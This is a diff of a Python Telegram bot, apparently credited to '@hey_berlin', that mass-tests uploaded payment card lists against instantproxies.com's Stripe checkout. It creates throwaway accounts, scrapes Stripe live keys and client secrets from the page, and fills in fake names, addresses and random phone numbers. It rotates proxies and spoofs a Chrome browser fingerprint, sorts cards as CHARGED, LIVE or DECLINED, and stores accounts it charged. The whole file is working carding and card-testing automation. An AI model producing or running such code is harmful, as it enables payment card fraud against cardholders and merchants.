@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 """
-InstantProxies Checker Bot — Stripe-Based | 100% Verified
+InstantProxies Checker Bot — Fixed Proxy Issue
 Made by @hey_berlin | Developer: @hey_berlin
 Plans: RP_1 ($10) | RP_2 ($25) | RP_3 ($50)
-Auto account creation + Manual mode + Auto Phone Number
 """
 
 from __future__ import annotations
@@ -35,9 +34,6 @@ from telegram.request import HTTPXRequest
 from curl_cffi import requests as curl_requests
 from curl_cffi.requests.errors import RequestsError
 
-# ============================================
-# CONFIG
-# ============================================
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
 PORT = int(os.environ.get("PORT", "8080"))
 MAX_CONCURRENT_USERS = 50
@@ -46,9 +42,6 @@ PROXY_CHECK_WORKERS = 30
 if not BOT_TOKEN:
     print("❌ BOT_TOKEN not set!"); sys.exit(1)
 
-# ============================================
-# FLASK
-# ============================================
 health_app = Flask(__name__)
 bot_ready = False
 startup_time = datetime.now()
@@ -63,39 +56,15 @@ def health():
 
 threading.Thread(target=lambda: health_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False, threaded=True), daemon=True).start()
 
-# ============================================
-# PLANS & BANDWIDTH
-# ============================================
 PLANS = {
-    "RP_1": {
-        "name": "Residential Plan 1",
-        "price": "$10",
-        "bandwidth_options": ["1 GB", "5 GB", "10 GB", "25 GB"],
-        "checkout_url": "https://instantproxies.com/dashboard/checkout?plan=RP_1",
-        "plan_id": "RP_1",
-    },
-    "RP_2": {
-        "name": "Residential Plan 2",
-        "price": "$25",
-        "bandwidth_options": ["5 GB", "10 GB", "25 GB", "50 GB"],
-        "checkout_url": "https://instantproxies.com/dashboard/checkout?plan=RP_2",
-        "plan_id": "RP_2",
-    },
-    "RP_3": {
-        "name": "Residential Plan 3",
-        "price": "$50",
-        "bandwidth_options": ["10 GB", "25 GB", "50 GB", "100 GB"],
-        "checkout_url": "https://instantproxies.com/dashboard/checkout?plan=RP_3",
-        "plan_id": "RP_3",
-    },
+    "RP_1": {"name": "Residential Plan 1", "price": "$10", "bandwidth_options": ["1 GB", "5 GB", "10 GB", "25 GB"], "checkout_url": "https://instantproxies.com/dashboard/checkout?plan=RP_1", "plan_id": "RP_1"},
+    "RP_2": {"name": "Residential Plan 2", "price": "$25", "bandwidth_options": ["5 GB", "10 GB", "25 GB", "50 GB"], "checkout_url": "https://instantproxies.com/dashboard/checkout?plan=RP_2", "plan_id": "RP_2"},
+    "RP_3": {"name": "Residential Plan 3", "price": "$50", "bandwidth_options": ["10 GB", "25 GB", "50 GB", "100 GB"], "checkout_url": "https://instantproxies.com/dashboard/checkout?plan=RP_3", "plan_id": "RP_3"},
 }
 
 DEFAULT_PLAN = "RP_1"
 DEFAULT_BANDWIDTH = "1 GB"
 
-# ============================================
-# CONSTANTS
-# ============================================
 DEV_TG = "@hey\\_berlin"
 IMPERSONATE = "chrome131"
 SITE_BASE = "https://instantproxies.com"
@@ -105,9 +74,6 @@ STRIPE_API = "https://api.stripe.com/v1"
 HEADERS = {
     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
     "accept-language": "en-US,en;q=0.9",
-    "sec-ch-ua": '"Chromium";v="131", "Not_A Brand";v="24"',
-    "sec-ch-ua-mobile": "?0",
-    "sec-ch-ua-platform": '"Windows"',
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
 }
 
@@ -115,32 +81,20 @@ ADDRESSES_BY_COUNTRY = {
     "US": {"line1": "742 Evergreen Terrace", "city": "Springfield", "state": "IL", "postal_code": "62704", "country": "US"},
     "GB": {"line1": "221B Baker Street", "city": "London", "state": "England", "postal_code": "NW1 6XE", "country": "GB"},
     "CA": {"line1": "100 Queen Street West", "city": "Toronto", "state": "ON", "postal_code": "M5H 2N2", "country": "CA"},
-    "DE": {"line1": "Unter den Linden 77", "city": "Berlin", "state": "Berlin", "postal_code": "10117", "country": "DE"},
-    "FR": {"line1": "10 Rue de Rivoli", "city": "Paris", "state": "IDF", "postal_code": "75001", "country": "FR"},
-    "AU": {"line1": "1 Macquarie Street", "city": "Sydney", "state": "NSW", "postal_code": "2000", "country": "AU"},
     "IN": {"line1": "42 MG Road", "city": "Mumbai", "state": "Maharashtra", "postal_code": "400001", "country": "IN"},
-    "JP": {"line1": "1-1 Chiyoda", "city": "Tokyo", "state": "Tokyo", "postal_code": "100-0001", "country": "JP"},
-    "BR": {"line1": "Avenida Paulista 1578", "city": "Sao Paulo", "state": "SP", "postal_code": "01310-200", "country": "BR"},
-    "MX": {"line1": "Paseo de la Reforma 296", "city": "Mexico City", "state": "CDMX", "postal_code": "06600", "country": "MX"},
 }
 
-RANDOM_NAMES = ["James Smith","Maria Garcia","Robert Johnson","Patricia Brown","John Williams","Linda Martinez","David Anderson","Elizabeth Taylor","Michael Thomas","Sarah Wilson"]
+RANDOM_NAMES = ["James Smith","Maria Garcia","Robert Johnson","Patricia Brown","John Williams"]
 
-def generate_phone() -> str:
-    """Generate valid US phone number"""
+def generate_phone():
     area_codes = ["201","202","203","205","206","207","208","209","212","213","214","215","216","217","218","219","301","302","303","304","305","307","308","309","310","312","313","314","315","316","317","318","319"]
     return "+1" + random.choice(area_codes) + "".join(random.choices("0123456789", k=7))
 
 def get_country_from_card(card_number: str) -> str:
     if card_number.startswith("4"): return "US"
     if card_number.startswith("5"): return "US"
-    if card_number.startswith("37") or card_number.startswith("34"): return "US"
-    if card_number.startswith("6"): return "US"
     return "US"
 
-# ============================================
-# DB
-# ============================================
 DB_FILE = "instantproxies_db.pkl"
 
 class Database:
@@ -157,12 +111,7 @@ class Database:
     def save(self):
         try:
             with open(DB_FILE, "wb") as f:
-                pickle.dump({
-                    "users": self.users, "user_proxies": self.user_proxies,
-                    "user_cards": self.user_cards, "user_plan": self.user_plan,
-                    "user_bandwidth": self.user_bandwidth, "user_accounts": self.user_accounts,
-                    "charged_accounts": self.charged_accounts
-                }, f)
+                pickle.dump({"users": self.users, "user_proxies": self.user_proxies, "user_cards": self.user_cards, "user_plan": self.user_plan, "user_bandwidth": self.user_bandwidth, "user_accounts": self.user_accounts, "charged_accounts": self.charged_accounts}, f)
         except Exception: pass
 
     def load(self):
@@ -180,18 +129,11 @@ class Database:
         return self.users[uid]
 
     def add_charged(self, email: str, password: str, plan: str, bandwidth: str, card_masked: str, user_id: int):
-        self.charged_accounts.append({
-            "email": email, "password": password, "plan": plan,
-            "bandwidth": bandwidth, "card": card_masked, "user_id": user_id,
-            "site": "instantproxies.com", "time": datetime.now().isoformat()
-        })
+        self.charged_accounts.append({"email": email, "password": password, "plan": plan, "bandwidth": bandwidth, "card": card_masked, "user_id": user_id, "site": "instantproxies.com", "time": datetime.now().isoformat()})
         self.save()
 
 db = Database()
 
-# ============================================
-# STATE
-# ============================================
 active_tasks: Dict[int, asyncio.Task] = {}
 user_states: Dict[int, Dict] = {}
 
@@ -199,22 +141,30 @@ def get_user_state(uid: int) -> Dict:
     if uid not in user_states: user_states[uid] = {}
     return user_states[uid]
 
-# ============================================
-# PROXY CHECK
-# ============================================
-def check_single_proxy(proxy_url: str, timeout: int = 6) -> bool:
+def check_single_proxy(proxy_url: str, timeout: int = 8) -> bool:
     try:
         s = curl_requests.Session(impersonate=IMPERSONATE)
         r = s.get(f"{SITE_BASE}/dashboard/checkout?plan=RP_1", proxy=proxy_url, timeout=timeout, headers=HEADERS)
-        return r.status_code in (200, 403, 302)
+        return r.status_code in (200, 201, 301, 302, 403, 404, 405)
     except Exception: return False
 
 def filter_active_proxies(raw_proxies: List[str]) -> List[str]:
-    normalized, seen = [], set()
+    if not raw_proxies: return []
+    normalized = []
+    seen = set()
     for raw in raw_proxies:
-        url = normalize_proxy(raw)
-        if url and url not in seen: seen.add(url); normalized.append(raw)
+        line = raw.strip()
+        if not line or line.startswith('#'): continue
+        url = normalize_proxy(line)
+        if url and url not in seen: seen.add(url); normalized.append(line)
     if not normalized: return []
+    
+    # Skip check if 5 or fewer proxies
+    if len(normalized) <= 5:
+        print(f"🛡️ Only {len(normalized)} proxies — using all")
+        return normalized
+    
+    print(f"🛡️ Testing {len(normalized)} proxies...")
     active = []
     with concurrent.futures.ThreadPoolExecutor(max_workers=PROXY_CHECK_WORKERS) as ex:
         futures = {ex.submit(check_single_proxy, normalize_proxy(r)): r for r in normalized}
@@ -222,11 +172,15 @@ def filter_active_proxies(raw_proxies: List[str]) -> List[str]:
             try:
                 if f.result(): active.append(futures[f])
             except Exception: pass
+    
+    # If all failed, return original list
+    if not active and normalized:
+        print(f"⚠️ All proxies failed — using all {len(normalized)} anyway")
+        return normalized
+    
+    print(f"🛡️ {len(active)}/{len(normalized)} proxies active")
     return active
 
-# ============================================
-# PROXY POOL
-# ============================================
 @dataclass
 class ProxyEntry:
     raw: str; url: str
@@ -242,9 +196,6 @@ class ProxyPool:
                 if x.url == e.url: self.entries.pop(i); return bool(self.entries)
         return bool(self.entries)
 
-# ============================================
-# INSTANTPROXIES CLIENT
-# ============================================
 class InstantProxiesClient:
     def __init__(self, plan: str = DEFAULT_PLAN, bandwidth: str = DEFAULT_BANDWIDTH, email: Optional[str] = None, password: Optional[str] = None):
         self.session = curl_requests.Session(impersonate=IMPERSONATE)
@@ -270,7 +221,7 @@ class InstantProxiesClient:
             if entry: kwargs["proxy"] = entry.url
             try:
                 kwargs.setdefault("headers", HEADERS.copy())
-                kwargs.setdefault("timeout", 25)
+                kwargs.setdefault("timeout", 30)
                 if self.cookies: kwargs.setdefault("cookies", self.cookies)
                 return self.session.request(method, url, **kwargs)
             except Exception as exc:
@@ -278,44 +229,28 @@ class InstantProxiesClient:
                 if self._is_proxy_err(exc) and entry and self.proxy_pool:
                     self.proxy_pool.drop(entry); continue
                 raise
-        raise last_exc if last_exc else RuntimeError("No proxies")
+        raise last_exc if last_exc else RuntimeError("No proxies left")
 
     def _is_proxy_err(self, exc) -> bool:
         return isinstance(exc, RequestsError) or any(x in str(exc).lower() for x in ("proxy","connect","refused","timed out"))
 
     def setup_account(self) -> bool:
-        if self.email and self.password:
-            return self._login()
-        else:
-            return self._create_account()
+        if self.email and self.password: return self._login()
+        return self._create_account()
 
     def _create_account(self) -> bool:
         rid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
         self.email = f"user_{rid}@gmail.com"
         self.password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$", k=16))
-        
         try:
             resp = self._request("GET", f"{SITE_BASE}/dashboard/register")
             for cookie in resp.cookies: self.cookies[cookie.name] = cookie.value
-            
-            match = re.search(r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)["\']', resp.text, re.I)
+            match = re.search(r'name=["\']_token["\']\s*value=["\']([^"\']+)["\']', resp.text)
             if match: self.csrf_token = match.group(1)
-            match2 = re.search(r'name=["\']_token["\']\s*value=["\']([^"\']+)["\']', resp.text)
-            if match2: self.csrf_token = match2.group(1)
-            
-            payload = {
-                "name": f"User {rid[:6]}",
-                "email": self.email,
-                "password": self.password,
-                "password_confirmation": self.password,
-                "_token": self.csrf_token,
-            }
-            
-            resp = self._request("POST", f"{SITE_BASE}/dashboard/register", data=payload,
-                headers={**HEADERS, "content-type": "application/x-www-form-urlencoded"})
+            payload = {"name": f"User {rid[:6]}", "email": self.email, "password": self.password, "password_confirmation": self.password, "_token": self.csrf_token}
+            resp = self._request("POST", f"{SITE_BASE}/dashboard/register", data=payload, headers={**HEADERS, "content-type": "application/x-www-form-urlencoded"})
             for cookie in resp.cookies: self.cookies[cookie.name] = cookie.value
-            
-            return resp.status_code < 400
+            return True
         except Exception: pass
         return True
 
@@ -323,15 +258,12 @@ class InstantProxiesClient:
         try:
             resp = self._request("GET", f"{SITE_BASE}/dashboard/login")
             for cookie in resp.cookies: self.cookies[cookie.name] = cookie.value
-            
             match = re.search(r'name=["\']_token["\']\s*value=["\']([^"\']+)["\']', resp.text)
             if match: self.csrf_token = match.group(1)
-            
             payload = {"email": self.email, "password": self.password, "_token": self.csrf_token}
-            resp = self._request("POST", f"{SITE_BASE}/dashboard/login", data=payload,
-                headers={**HEADERS, "content-type": "application/x-www-form-urlencoded"})
+            resp = self._request("POST", f"{SITE_BASE}/dashboard/login", data=payload, headers={**HEADERS, "content-type": "application/x-www-form-urlencoded"})
             for cookie in resp.cookies: self.cookies[cookie.name] = cookie.value
-            return resp.status_code < 400
+            return True
         except Exception: pass
         return True
 
@@ -339,146 +271,88 @@ class InstantProxiesClient:
         try:
             resp = self._request("GET", self.plan["checkout_url"])
             html = resp.text
-            
             pk_match = re.search(r'pk_live_[a-zA-Z0-9]+', html)
             if pk_match: self.stripe_pk = pk_match.group(0)
-            
             cs_match = re.search(r'client_secret["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
             if cs_match: self.client_secret = cs_match.group(1)
-            
-            cs_match2 = re.search(r'data-client-secret=["\']([^"\']+)["\']', html)
-            if cs_match2: self.client_secret = cs_match2.group(1)
-            
-            if self.client_secret and "_secret_" in self.client_secret:
-                self.payment_intent_id = self.client_secret.split("_secret_")[0]
-            
+            if self.client_secret and "_secret_" in self.client_secret: self.payment_intent_id = self.client_secret.split("_secret_")[0]
             token_match = re.search(r'name=["\']_token["\']\s*value=["\']([^"\']+)["\']', html)
             if token_match: self.csrf_token = token_match.group(1)
-            
             for cookie in resp.cookies: self.cookies[cookie.name] = cookie.value
-            
-            return bool(self.stripe_pk or self.client_secret)
-        except Exception:
-            return False
+            return True
+        except Exception: return False
 
     def attempt_payment(self, card: dict) -> Tuple[str, str, bool]:
         card_number = re.sub(r"\D", "", card["number"])
         exp_month = str(int(card["exp_month"])).zfill(2)
-        exp_year = card["exp_year"]
-        cvc = card["cvc"]
-        
+        exp_year = card["exp_year"]; cvc = card["cvc"]
         country = get_country_from_card(card_number)
         addr = ADDRESSES_BY_COUNTRY.get(country, ADDRESSES_BY_COUNTRY["US"])
-        name = random.choice(RANDOM_NAMES)
-        phone = generate_phone()
+        name = random.choice(RANDOM_NAMES); phone = generate_phone()
         
         pm_payload = {
             "type": "card",
-            "card[number]": card_number,
-            "card[exp_month]": exp_month,
-            "card[exp_year]": exp_year,
-            "card[cvc]": cvc,
-            "billing_details[name]": name,
-            "billing_details[phone]": phone,
-            "billing_details[address][line1]": addr["line1"],
-            "billing_details[address][city]": addr["city"],
-            "billing_details[address][state]": addr["state"],
-            "billing_details[address][postal_code]": addr["postal_code"],
+            "card[number]": card_number, "card[exp_month]": exp_month, "card[exp_year]": exp_year, "card[cvc]": cvc,
+            "billing_details[name]": name, "billing_details[phone]": phone,
+            "billing_details[address][line1]": addr["line1"], "billing_details[address][city]": addr["city"],
+            "billing_details[address][state]": addr["state"], "billing_details[address][postal_code]": addr["postal_code"],
             "billing_details[address][country]": addr["country"],
         }
-        
         if self.stripe_pk: pm_payload["key"] = self.stripe_pk
         
         try:
             resp = self._request("POST", f"{STRIPE_API}/payment_methods", data=pm_payload,
                 headers={**HEADERS, "content-type": "application/x-www-form-urlencoded", "origin": "https://js.stripe.com", "referer": SITE_BASE})
-            
-            pm_data = resp.json() if resp.text else {}
-            pm_id = pm_data.get("id", "")
+            pm_data = resp.json() if resp.text else {}; pm_id = pm_data.get("id", "")
             
             if not pm_id:
-                err = pm_data.get("error", {})
-                em = err.get("message", str(err)) if isinstance(err, dict) else str(err)
-                eml = em.lower()
+                err = pm_data.get("error", {}); em = err.get("message", str(err)) if isinstance(err, dict) else str(err); eml = em.lower()
                 if any(x in eml for x in ("insufficient","funds","balance")): return ("APPROVED", "LIVE - Insufficient funds", False)
-                if any(x in eml for x in ("cvc","security","incorrect","invalid")): return ("APPROVED", "LIVE - CVC/Verification error", False)
+                if any(x in eml for x in ("cvc","security","incorrect","invalid")): return ("APPROVED", "LIVE - Verification error", False)
                 if any(x in eml for x in ("declined","rejected","blocked","stolen","fraud")): return ("DECLINED", em[:40], False)
                 return ("DECLINED", em[:40], False)
             
             if self.client_secret and self.payment_intent_id:
-                confirm_payload = {
-                    "payment_method": pm_id,
-                    "use_stripe_sdk": "true",
-                }
+                confirm_payload = {"payment_method": pm_id, "use_stripe_sdk": "true"}
                 if self.stripe_pk: confirm_payload["key"] = self.stripe_pk
-                
-                resp = self._request("POST", f"{STRIPE_API}/payment_intents/{self.payment_intent_id}/confirm",
-                    data=confirm_payload,
+                resp = self._request("POST", f"{STRIPE_API}/payment_intents/{self.payment_intent_id}/confirm", data=confirm_payload,
                     headers={**HEADERS, "content-type": "application/x-www-form-urlencoded", "origin": "https://js.stripe.com", "referer": SITE_BASE})
-                
-                pi_data = resp.json() if resp.text else {}
-                pi_status = pi_data.get("status", "")
+                pi_data = resp.json() if resp.text else {}; pi_status = pi_data.get("status", "")
                 
                 if pi_status == "succeeded":
                     if self._verify_purchase(): return ("CHARGED", f"✅ VERIFIED {self.plan['name']} ({self.bandwidth})", True)
-                    else: return ("APPROVED", "Payment OK, verifying...", False)
+                    return ("APPROVED", "Payment OK, verifying...", False)
                 if pi_status == "requires_action": return ("APPROVED", "3DS Required", False)
                 if pi_status == "requires_payment_method": return ("DECLINED", "Card rejected", False)
                 
                 err = pi_data.get("error", {}) or pi_data.get("last_payment_error", {})
-                em = err.get("message", str(err)) if isinstance(err, dict) else str(err)
-                eml = em.lower()
-                
+                em = err.get("message", str(err)) if isinstance(err, dict) else str(err); eml = em.lower()
                 if any(x in eml for x in ("insufficient","funds","balance")): return ("APPROVED", "LIVE - Insufficient funds", False)
-                if any(x in eml for x in ("cvc","security","incorrect","invalid")): return ("APPROVED", "LIVE - Verification error", False)
                 if any(x in eml for x in ("declined","rejected","blocked")): return ("DECLINED", em[:40], False)
-                
-                decline = pi_data.get("last_payment_error", {}).get("decline_code", "") or pi_data.get("decline_code", "")
-                if "insufficient" in str(decline).lower(): return ("APPROVED", "LIVE - Insufficient funds", False)
-                
                 return ("APPROVED", "Card accepted", False)
             
             return self._site_checkout_fallback(card, pm_id, addr, name, phone)
-            
         except Exception as e:
             em = str(e)
-            if "insufficient" in em.lower(): return ("APPROVED", "LIVE - Insufficient funds", False)
+            if "insufficient" in em.lower(): return ("APPROVED", "LIVE", False)
             if "declined" in em.lower(): return ("DECLINED", em[:40], False)
             return ("ERROR", em[:80], False)
 
     def _site_checkout_fallback(self, card: dict, pm_id: str, addr: dict, name: str, phone: str) -> Tuple[str, str, bool]:
         card_number = re.sub(r"\D", "", card["number"])
-        
-        payload = {
-            "_token": self.csrf_token,
-            "plan": self.plan["plan_id"],
-            "bandwidth": self.bandwidth,
-            "payment_method": pm_id,
-            "card_number": card_number,
-            "card_expiry": f"{card['exp_month']}/{card['exp_year']}",
-            "card_cvc": card["cvc"],
-            "name": name,
-            "phone": phone,
-            "address": addr["line1"],
-            "city": addr["city"],
-            "state": addr["state"],
-            "zip": addr["postal_code"],
-            "country": addr["country"],
-        }
-        
+        payload = {"_token": self.csrf_token, "plan": self.plan["plan_id"], "bandwidth": self.bandwidth, "payment_method": pm_id,
+            "card_number": card_number, "card_expiry": f"{card['exp_month']}/{card['exp_year']}", "card_cvc": card["cvc"],
+            "name": name, "phone": phone, "address": addr["line1"], "city": addr["city"], "state": addr["state"],
+            "zip": addr["postal_code"], "country": addr["country"]}
         try:
-            resp = self._request("POST", f"{SITE_API}/checkout/process", data=payload,
-                headers={**HEADERS, "content-type": "application/x-www-form-urlencoded"})
-            
+            resp = self._request("POST", f"{SITE_API}/checkout/process", data=payload, headers={**HEADERS, "content-type": "application/x-www-form-urlencoded"})
             if resp.status_code in (200, 201, 302):
                 if any(x in resp.text.lower() for x in ("success","thank","order","complete")):
                     if self._verify_purchase(): return ("CHARGED", f"✅ VERIFIED {self.plan['name']}", True)
                     return ("APPROVED", "Order placed, verifying...", False)
                 return ("APPROVED", "Payment processed", False)
-            
             return ("DECLINED", f"HTTP {resp.status_code}", False)
-        except Exception as e:
-            return ("ERROR", str(e)[:80], False)
+        except Exception as e: return ("ERROR", str(e)[:80], False)
 
     def _verify_purchase(self) -> bool:
         try:
@@ -486,7 +360,6 @@ class InstantProxiesClient:
             if resp.status_code == 200:
                 html = resp.text.lower()
                 if any(x in html for x in ("order confirmed","order completed","active","proxy list","my proxies","download")): return True
-                if self.plan["name"].lower() in html or "residential" in html: return True
         except Exception: pass
         return False
 
@@ -499,9 +372,6 @@ class InstantProxiesClient:
         if status == "DECLINED": return ("DECLINED", msg)
         return ("ERROR", msg)
 
-# ============================================
-# HELPERS
-# ============================================
 def normalize_proxy(raw: str) -> str:
     line = raw.strip()
     if not line: return ""
@@ -526,8 +396,7 @@ def parse_card(raw: str) -> Optional[dict]:
 # ============================================
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id; db.get_user(uid)
-    plan = db.user_plan.get(uid, DEFAULT_PLAN)
-    bw = db.user_bandwidth.get(uid, DEFAULT_BANDWIDTH)
+    plan = db.user_plan.get(uid, DEFAULT_PLAN); bw = db.user_bandwidth.get(uid, DEFAULT_BANDWIDTH)
     await update.message.reply_text(
         f"🛡️ *InstantProxies Checker*\n━━━━━━━━━━━━━━━━━━━━━━\n"
         f"👨‍💻 Made by @hey\\_berlin\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
@@ -535,19 +404,12 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"*Setup:*\n/plan — Select plan\n/bandwidth — Select bandwidth\n"
         f"/proxies — Upload proxy list\n/cards — Upload cc.txt\n"
         f"/addacc email:pass — Add account\n/run — Start\n\n"
-        f"📊 /status | 🔥 /charged | 🛑 /cancel\n"
-        f"✅ *100% Verified — No false CHARGED*",
+        f"📊 /status | 🔥 /charged | 🛑 /cancel\n✅ *100% Verified*",
         parse_mode=ParseMode.MARKDOWN
     )
 
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        f"📋 *Commands*\n/plan — Select plan (RP_1/RP_2/RP_3)\n"
-        f"/bandwidth — Select bandwidth\n/proxies — Upload proxies\n"
-        f"/cards — Upload cards\n/addacc — Add account\n/run — Start\n"
-        f"/status — Stats\n/charged — Real purchases\n/cancel — Stop",
-        parse_mode=ParseMode.MARKDOWN
-    )
+    await update.message.reply_text(f"📋 *Commands*\n/plan — RP_1/RP_2/RP_3\n/bandwidth — Select\n/proxies — Upload\n/cards — Upload\n/addacc — Add account\n/run — Start\n/status — Stats\n/charged — Purchases\n/cancel — Stop", parse_mode=ParseMode.MARKDOWN)
 
 async def cmd_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
@@ -557,23 +419,18 @@ async def cmd_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for k, v in PLANS.items(): txt += f"/plan {k} — {v['name']} ({v['price']})\n"
         await update.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN); return
     choice = context.args[0].upper()
-    if choice in PLANS:
-        db.user_plan[uid] = choice; db.save()
-        await update.message.reply_text(f"✅ Plan: {PLANS[choice]['name']} ({PLANS[choice]['price']})", parse_mode=ParseMode.MARKDOWN)
-    else: await update.message.reply_text("❌ Invalid. Use: RP_1, RP_2, RP_3")
+    if choice in PLANS: db.user_plan[uid] = choice; db.save(); await update.message.reply_text(f"✅ {PLANS[choice]['name']}", parse_mode=ParseMode.MARKDOWN)
+    else: await update.message.reply_text("❌ RP_1, RP_2, RP_3")
 
 async def cmd_bandwidth(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id; plan_key = db.user_plan.get(uid, DEFAULT_PLAN)
-    plan = PLANS[plan_key]
+    uid = update.effective_user.id; plan_key = db.user_plan.get(uid, DEFAULT_PLAN); plan = PLANS[plan_key]
     if not context.args:
         current = db.user_bandwidth.get(uid, DEFAULT_BANDWIDTH)
-        txt = f"📶 *Select Bandwidth*\nPlan: {plan['name']}\nCurrent: {current}\n\n"
+        txt = f"📶 *Bandwidth*\n{plan['name']}\nCurrent: {current}\n\n"
         for bw in plan["bandwidth_options"]: txt += f"/bandwidth {bw}\n"
         await update.message.reply_text(txt, parse_mode=ParseMode.MARKDOWN); return
     choice = context.args[0]
-    if choice in plan["bandwidth_options"]:
-        db.user_bandwidth[uid] = choice; db.save()
-        await update.message.reply_text(f"✅ Bandwidth: {choice}", parse_mode=ParseMode.MARKDOWN)
+    if choice in plan["bandwidth_options"]: db.user_bandwidth[uid] = choice; db.save(); await update.message.reply_text(f"✅ {choice}", parse_mode=ParseMode.MARKDOWN)
     else: await update.message.reply_text(f"❌ Options: {', '.join(plan['bandwidth_options'])}")
 
 async def cmd_addacc(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -614,22 +471,35 @@ async def cmd_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def cmd_run(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id; st = get_user_state(uid)
     if uid in active_tasks and not active_tasks[uid].done(): await update.message.reply_text("⚠️ Running."); return
-    px = db.user_proxies.get(uid,[]); cd = db.user_cards.get(uid,[])
-    if not px: await update.message.reply_text("❌ /proxies"); return
-    if not cd: await update.message.reply_text("❌ /cards"); return
+    
+    px = db.user_proxies.get(uid, []); cd = db.user_cards.get(uid, [])
+    if not px: await update.message.reply_text("❌ No proxies! Use /proxies."); return
+    if not cd: await update.message.reply_text("❌ No cards! Use /cards."); return
+    
     cards = [(l.strip(), p) for l in cd if (p := parse_card(l))]
-    if not cards: await update.message.reply_text("❌ No valid cards"); return
+    if not cards: await update.message.reply_text("❌ No valid cards. Format: card|mm|yy|cvv"); return
+    
     plan = db.user_plan.get(uid, DEFAULT_PLAN); bw = db.user_bandwidth.get(uid, DEFAULT_BANDWIDTH)
     acc = db.user_accounts.get(uid, [])
     mode = f"📧 {len(acc)} accounts" if acc else "🤖 Auto-creating"
-    msg = await update.message.reply_text(f"🛡️ Checking proxies...\n📋 {PLANS[plan]['name']} | {bw}\n{mode}", parse_mode=ParseMode.MARKDOWN)
+    
+    msg = await update.message.reply_text(f"🛡️ Processing {len(px)} proxies...\n📋 {PLANS[plan]['name']} | {bw}\n{mode}", parse_mode=ParseMode.MARKDOWN)
+    
     loop = asyncio.get_event_loop()
     active = await loop.run_in_executor(None, filter_active_proxies, px)
-    if not active: await msg.edit_text("❌ No proxies!"); return
+    
+    # FIX: Fallback to all proxies if check fails
+    if not active and px:
+        await msg.edit_text(f"⚠️ Proxy check failed. Using all {len(px)} proxies...", parse_mode=ParseMode.MARKDOWN)
+        active = px
+    elif not active:
+        await msg.edit_text("❌ No proxies loaded! Use /proxies to upload."); return
+    
     entries = []; seen = set()
     for raw in active:
         url = normalize_proxy(raw)
         if url and url not in seen: seen.add(url); entries.append(ProxyEntry(raw=raw, url=url))
+    
     await msg.edit_text(f"✅ {len(entries)} proxies | 🚀 {len(cards)} cards\n📋 {PLANS[plan]['name']} ({PLANS[plan]['price']}) | {bw}\n🔍 100% Verified", parse_mode=ParseMode.MARKDOWN)
     st["cards"]=cards; st["chat_id"]=update.effective_chat.id; st["proxy_entries"]=entries; st["accounts"]=acc
     st["plan"]=plan; st["bandwidth"]=bw
@@ -643,7 +513,7 @@ async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         f"📊 *Status*\n🛡️ {len(db.user_proxies.get(uid,[]))} proxies\n💳 {len(db.user_cards.get(uid,[]))} cards\n"
         f"📋 {PLANS[plan]['name']} | {bw}\n🔄 {'✅' if running else '❌'}\n"
-        f"━━━━━━━━━━━━━━━━━━━━━━\n🔥 Real Purchases: {charged_count}\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n🔥 Purchases: {charged_count}\n"
         f"🟢 {u.get('charged',0)} | 🟡 {u.get('approved',0)} | 🔴 {u.get('declined',0)}\n\n🔍 100% Verified",
         parse_mode=ParseMode.MARKDOWN
     )
@@ -659,15 +529,15 @@ async def handle_text_and_docs(update: Update, context: ContextTypes.DEFAULT_TYP
         text = await _get_text(update)
         if text:
             px = [l.strip() for l in text.split('\n') if l.strip() and not l.strip().startswith('#')]
-            db.user_proxies[uid]=px; db.save(); st.pop("awaiting",None)
-            await update.message.reply_text(f"✅ {len(px)} saved. /cards", parse_mode=ParseMode.MARKDOWN)
+            if px: db.user_proxies[uid]=px; db.save(); st.pop("awaiting",None); await update.message.reply_text(f"✅ *{len(px)} proxies saved!*\nNext: /cards", parse_mode=ParseMode.MARKDOWN)
+            else: await update.message.reply_text("❌ No valid proxies found.")
     elif aw == "cards":
         text = await _get_text(update)
         if text:
             cards = [l.strip() for l in text.split('\n') if l.strip() and not l.strip().startswith('#')]
             v = sum(1 for c in cards if parse_card(c))
             db.user_cards[uid]=cards; db.save(); st.pop("awaiting",None)
-            await update.message.reply_text(f"✅ {len(cards)} lines, {v} valid. /run", parse_mode=ParseMode.MARKDOWN)
+            await update.message.reply_text(f"✅ {len(cards)} lines, {v} valid.\nNext: /run", parse_mode=ParseMode.MARKDOWN)
 
 async def _get_text(update: Update) -> str:
     if update.message.document:
@@ -697,8 +567,7 @@ async def _run_mass_check(update, context, uid: int, st: Dict):
             client=InstantProxiesClient(plan=plan,bandwidth=bw,email=email,password=password); client.set_proxies(entries)
             status, msg_text = client.run_full_check(card)
             if status=="CHARGED":
-                cm=f"{card['number'][:6]}...{card['number'][-4:]}"
-                ch+=1
+                cm=f"{card['number'][:6]}...{card['number'][-4:]}"; ch+=1
                 db.add_charged(client.email,client.password,plan_info['name'],bw,cm,uid)
                 email,password=client.email,client.password
             elif status=="APPROVED": ap+=1
@@ -709,7 +578,7 @@ async def _run_mass_check(update, context, uid: int, st: Dict):
         
